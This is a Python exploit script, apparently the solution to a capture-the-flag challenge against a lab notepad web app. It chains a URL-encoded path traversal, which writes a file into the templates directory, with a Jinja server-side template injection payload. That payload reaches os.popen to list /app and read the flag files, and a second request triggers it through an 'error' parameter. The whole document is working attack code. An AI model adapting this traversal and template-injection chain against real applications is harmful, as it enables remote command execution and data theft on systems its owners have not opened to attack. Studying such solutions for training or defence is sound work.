import sys, requests, re, urllib.parse
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})

# 1) ecrire un template Jinja dans templates/ via url_fix (le %2f devient / apres le check)
payload_tpl = "{%print(cycler.__init__.__globals__.os.popen('ls /app; cat /app/flag-*.txt').read())%}"
content = "..%2ftemplates%2fpwn"          # url_fix -> ../templates/pwn
r = S.post(BASE + "/new", data={"content": content + payload_tpl}, timeout=20, verify=False, allow_redirects=False)
loc = r.headers.get("Location", "")
print("status:", r.status_code, "location:", loc)
# 2) le fichier ecrit = static/../templates/pwn-<token>.html
m = re.search(r"(pwn-[A-Za-z0-9_\-]+\.html)", loc)
if not m:
    print("pas de nom de fichier:", loc[:200])
    sys.exit(1)
fname = m.group(1)
print("fichier cree:", fname)
# 3) l'inclure via le parametre error
err = "../" + fname[: -len(".html")]
r2 = S.get(BASE + "/", params={"error": err}, timeout=20, verify=False)
print("=== reponse ===")
print(r2.text[:1500])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r2.text)
print("FLAG:", f.group(0) if f else "non trouve")
